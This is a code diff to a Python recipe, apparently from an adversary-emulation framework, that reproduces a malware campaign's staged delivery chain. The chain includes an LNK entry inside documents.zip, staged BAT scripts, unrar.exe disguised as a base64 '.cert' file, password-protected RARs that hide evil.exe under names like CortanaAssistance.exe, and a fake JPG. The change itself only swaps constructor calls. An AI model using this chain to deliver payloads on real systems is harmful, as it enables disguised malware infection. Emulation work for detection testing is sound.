@@ -6,7 +6,7 @@ from make.bat.bat import *
 from make.rar.rar import makeRar
 
 from helpers import *
-from model import AceFile, AceRoute
+from model import *
 
 
 def pyration10(baseUrl) -> List[AceRoute]:
@@ -15,25 +15,25 @@ def pyration10(baseUrl) -> List[AceRoute]:
     # Payload: unrar.cert: unrar.exe base64 encoded
     unrar: AceBytes = readFileContent('recipes/pyration10/unrar.exe')
     unrarB64: AceStr = base64encode(unrar)
-    serveHtml: AceRoute = AceRoute('/pyration10/unrar.cert', unrarB64, info='unrar.exe')
+    serveHtml: AceRoute = makeAceRoute('/pyration10/unrar.cert', unrarB64, info='unrar.exe')
     routes.append(serveHtml)
 
     # Payload: setup.rar: PW "2022": CortanaAssistance.exe
     evilexe: AceBytes = readFileContent('payloads/evil.exe')
     evilExeFile: AceFile = makeAceFile('CortanaAssistance.exe', evilexe)
     evilexeRar: AceBytes = makeRar([evilExeFile], password='2022')
-    serveHtml: AceRoute = AceRoute('/pyration10/assist.rar', evilexeRar, info='CortanaAssistance.exe')
+    serveHtml: AceRoute = makeAceRoute('/pyration10/assist.rar', evilexeRar, info='CortanaAssistance.exe')
     routes.append(serveHtml)
 
     # Payload: assist.rar: PW "2022": ctask.exe
     evilExeFile: AceFile = makeAceFile('ctask.exe', evilexe)
     evilexeRar: AceBytes = makeRar([evilExeFile], password='2022')
-    serveHtml: AceRoute = AceRoute('/pyration10/setup.rar', evilexeRar, info='ctask.exe')
+    serveHtml: AceRoute = makeAceRoute('/pyration10/setup.rar', evilexeRar, info='ctask.exe')
     routes.append(serveHtml)
     
     # Payload: Fake JPG
     pic: AceBytes = readFileContent('recipes/pyration10/front.jpg')
-    serveHtml: AceRoute = AceRoute('/pyration10/front.jpg', pic, info='Fake Image')
+    serveHtml: AceRoute = makeAceRoute('/pyration10/front.jpg', pic, info='Fake Image')
     routes.append(serveHtml)
 
     # Stage 2: BAT
@@ -42,7 +42,7 @@ def pyration10(baseUrl) -> List[AceRoute]:
         setupUrl=baseUrl + '/pyration10/setup.rar',
         certUrl=baseUrl + '/pyration10/unrar.cert',
     )
-    serveHtml: AceRoute = AceRoute('/pyration10/c.txt', rendered, info='stage2.bat')
+    serveHtml: AceRoute = makeAceRoute('/pyration10/c.txt', rendered, info='stage2.bat')
     routes.append(serveHtml)
 
     # Stage 1: BAT
@@ -51,7 +51,7 @@ def pyration10(baseUrl) -> List[AceRoute]:
         picUrl=baseUrl + '/pyration10/front.jpg',
     )
     stage1bat: AceFile = makeAceFile('stage1.bat', rendered)
-    serveHtml: AceRoute = AceRoute('/pyration10/front.txt', rendered, info='stage1.bat')
+    serveHtml: AceRoute = makeAceRoute('/pyration10/front.txt', rendered, info='stage1.bat')
     routes.append(serveHtml)
 
     # Initial Vector: LNK
@@ -73,7 +73,7 @@ def pyration10(baseUrl) -> List[AceRoute]:
         ],
     )
     containerFile: AceFile = makeAceFile('documents.zip', container)
-    serveHtml: AceRoute = AceRoute(
+    serveHtml: AceRoute = makeAceRoute(
         '/pyration10/pyration10-documents.zip', 
         container, 
         info="Entry",
@@ -81,7 +81,7 @@ def pyration10(baseUrl) -> List[AceRoute]:
     routes.append(serveHtml)
 
     cleanupbat: AceBytes = readFileContent('recipes/pyration10/cleanup.bat')
-    serveHtml: AceRoute = AceRoute(
+    serveHtml: AceRoute = makeAceRoute(
         '/pyration10/cleanup.bat', 
         cleanupbat, 
         info="Cleanup File",
